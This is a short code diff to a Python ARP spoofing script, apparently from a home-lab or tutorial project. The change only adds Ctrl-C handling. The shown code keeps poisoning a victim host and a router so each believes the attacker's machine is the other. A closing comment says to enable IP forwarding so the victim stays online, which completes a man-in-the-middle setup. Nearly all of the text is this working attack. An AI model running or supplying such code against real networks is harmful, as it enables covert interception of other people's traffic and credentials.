@@ -28,12 +28,16 @@ def arp_spoof(target_ip, spoof_ip):
 
 # To allow the program to keep spoofing the victim and the router
 counter = 0
-while True:
-    arp_spoof('10.0.2.4', '10.0.2.1') # Tell the victim that I am the router
-    arp_spoof('10.0.2.1', '10.0.2.4') # Tell the router that I am the victim
-    counter += 2
-    print(f'\r[+] Packets sent: {counter}', end='')
-    time.sleep(2)
+try:
+    while True:
+        arp_spoof('10.0.2.4', '10.0.2.1') # Tell the victim that I am the router
+        arp_spoof('10.0.2.1', '10.0.2.4') # Tell the router that I am the victim
+        counter += 2
+        print(f'\r[+] Packets sent: {counter}', end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('\n[+] Exiting Program...')
+
 
 
 # Try running this 'echo 1 > /proc/sys/net/ipv4/ip_forward' to allow the victim machine to connect to the internet
